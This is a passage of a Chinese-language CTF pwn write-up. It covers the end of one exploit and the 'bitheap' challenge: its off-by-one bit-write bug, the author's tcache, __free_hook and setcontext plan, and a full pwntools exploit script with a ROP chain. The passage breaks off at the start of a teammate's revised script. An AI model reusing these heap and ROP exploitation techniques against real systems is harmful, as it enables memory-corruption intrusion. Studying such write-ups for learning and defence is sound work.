class="number">8</span> <span class="comment"># p64(syscall_ret)</span></span><br><span class="line">payload += p8(<span class="number">0xa4</span>)+p8(<span class="number">0xf0</span>)+p8(<span class="number">0x68</span>)   </span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span> <span class="comment"># p64(0)</span></span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">6</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">6</span> <span class="comment"># p64(pop_rax_ret)</span></span><br><span class="line">payload += p8(<span class="number">0x8a</span>)+p8(<span class="number">0xdb</span>)+p8(<span class="number">0x5b</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">5</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">5</span> <span class="comment"># p64(0x10)</span></span><br><span class="line">payload += p8(<span class="number">0x10</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">4</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">4</span> <span class="comment"># p64(pop_rdx_ret)</span></span><br><span class="line">payload +=  p8(<span class="number">0x4f</span>)+p8(<span class="number">0x45</span>)+p8(<span class="number">0x40</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">3</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">3</span> <span class="comment"># p64(bss_addr)</span></span><br><span class="line">payload += p8(<span class="number">0xa0</span>)+p8(<span class="number">0xa4</span>)+p8(<span class="number">0x81</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">2</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">2</span> <span class="comment"># p64(pop_rsi_ret)</span></span><br><span class="line">payload += p8(<span class="number">0xbe</span>)+p8(<span class="number">0x8b</span>)+p8(<span class="number">0x58</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">1</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">1</span> <span class="comment"># p64(0)</span></span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">0</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">0</span> <span class="comment"># p64(pop_rdi_ret)</span></span><br><span class="line">payload += p8(<span class="number">0x82</span>)+p8(<span class="number">0x49</span>)+p8(<span class="number">0x40</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="string">b&#x27;admin&#x27;</span>, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bitheap: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=e08d4e4d4446d75cea81e7c8527abcfe54cc8768, stripped      </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，Canary，NX，PIE</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( num &lt;= <span class="number">0xF</span> &amp;&amp; chunk_list[num] )</span><br><span class="line">&#123;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, (__int64)<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  fill((<span class="keyword">char</span> *)chunk_list[index], <span class="number">8LL</span> * size_list[index] + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>修改模块中有 off-by-one</li>
<li>具体的写入部分：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">len = __read_chk(<span class="number">0LL</span>, buf, size, <span class="number">0x1008</span>LL);</span><br><span class="line"><span class="keyword">if</span> ( len )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a = <span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>);</span><br><span class="line">      bit = &amp;chunk[(<span class="keyword">int</span>)i &gt;&gt; <span class="number">3</span>];</span><br><span class="line">      b = *bit &amp; ~(<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>));</span><br><span class="line">      <span class="keyword">if</span> ( buf[i] == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++i;</span><br><span class="line">      *bit = b;</span><br><span class="line">      <span class="keyword">if</span> ( len == i )</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">    &#125;</span><br><span class="line">    *bit = a + b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>按位写入，可以溢出最后一字节</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>比赛时我的思路很简单：</p>
<ul>
<li>放满 tcache 使 free chunk 进入 unsortedbin，再利用本题目“申请模块”不写入的特性（不覆盖）进行泄露</li>
<li>使用标准的 unlink 攻击模板，造成 overlapping</li>
<li>劫持 tcache-&gt;next 指针，把 chunk 申请到 free_hook 上</li>
<li>劫持 free_hook 为 one_gadget</li>
</ul>
<p>后来发现 one_gadget 打不通远程，于是把它换成 system，但还是打不通（但可以执行 puts，当时以为服务器上的文件开了沙盒）</p>
<p>之后打算用 ORW：</p>
<ul>
<li>和之前一样的思路进行泄露和劫持 free_hook </li>
<li>把 free_hook 劫持为 setcontext+53</li>
<li>申请一个足够大的 chunk 用于存放 ORW 链</li>
<li>把 free_hook+0xa0 劫持为 ORW 链起始地址（因为我打算直接释放申请出来的 free_hook）</li>
<li>把 free_hook+0xa8 劫持为 ret_addr</li>
</ul>
<p>结果还是打不通远程，当时就以为是题目文件名不是“flag”，但回显信息说明 write 函数根本就没有执行（libc_base 是正确的，程序地址应该也没有问题），这就很郁闷</p>
<p>我当时的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd +=<span class="string">&quot;b *$rebase(0x982)\n&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bitheap&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;39.106.13.71&quot;,13642)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">bin</span>(addr).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>[::-<span class="number">1</span>].ljust(<span class="number">64</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeb</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">bin</span>(addr).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>[::-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    add(i,<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0xb8</span>)</span><br><span class="line">show(<span class="number">0xf</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3ebd50</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x620</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">puts_libc = libc_base + libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">0</span>] + libc_base</span><br><span class="line"></span><br><span class="line">open_libc = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">write_libc = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">read_libc = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line">ret = libc_base + <span class="number">0x00000000000008aa</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;setcontext &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">payload = change(<span class="number">0x4000000</span>)*(<span class="number">0xb0</span>/<span class="number">8</span>) + change(<span class="number">0x170</span>)</span><br><span class="line">edit(<span class="number">11</span>,payload)</span><br><span class="line"></span><br><span class="line">heap_addr = heap_base + <span class="number">0x9d0</span></span><br><span class="line">payload = change(<span class="number">0</span>)+change(<span class="number">0x171</span>)+change(heap_addr+<span class="number">0x18</span>)+change(heap_addr+<span class="number">0x20</span>)+change(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">10</span>,payload)</span><br><span class="line">delete(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xb8</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">rop_start = heap_base + <span class="number">0xe40</span></span><br><span class="line">payload = change(<span class="number">0</span>)+change(<span class="number">0xa0</span>)+change(free_hook)</span><br><span class="line">edit(<span class="number">0xa</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload = change(puts_libc)</span></span><br><span class="line"><span class="string">add(12,0xb8)</span></span><br><span class="line"><span class="string">add(14,0xb8)</span></span><br><span class="line"><span class="string">edit(14,payload)</span></span><br><span class="line"><span class="string">delete(14)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = change(setcontext) + change(<span class="number">0</span>)*(<span class="number">0x98</span>/<span class="number">8</span>) + change(rop_start) + change(ret)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xb8</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xb8</span>)</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x270</span></span><br><span class="line">payload = changeb(<span class="number">46</span>)+changeb(<span class="number">47</span>)+changeb(<span class="number">102</span>)+changeb(<span class="number">108</span>)+changeb(<span class="number">97</span>)+changeb(<span class="number">103</span>)+changeb(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += change(<span class="number">0</span>)</span><br><span class="line">payload += change(pop_rax_ret) + change(<span class="number">2</span>) + change(pop_rdi_ret) + change(rop_start-<span class="number">0x10</span>) + change(pop_rsi_ret) + change(<span class="number">0</span>) + change(pop_rdx_ret) + change(<span class="number">0</span>) + change(syscall_ret)</span><br><span class="line">payload += change(pop_rax_ret) + change(<span class="number">0</span>) + change(pop_rdi_ret) + change(<span class="number">3</span>) + change(pop_rsi_ret) + change(flag_addr) + change(pop_rdx_ret) + change(<span class="number">0x30</span>) + change(syscall_ret)</span><br><span class="line">payload += change(pop_rax_ret) + change(<span class="number">1</span>) + change(pop_rdi_ret) + change(<span class="number">1</span>) + change(pop_rsi_ret) + change(flag_addr) + change(pop_rdx_ret) + change(<span class="number">0x30</span>) + change(syscall_ret)</span><br><span class="line">success(<span class="string">&quot;payload len:&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>我的队友把 exp 给我改了一下，改后的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span 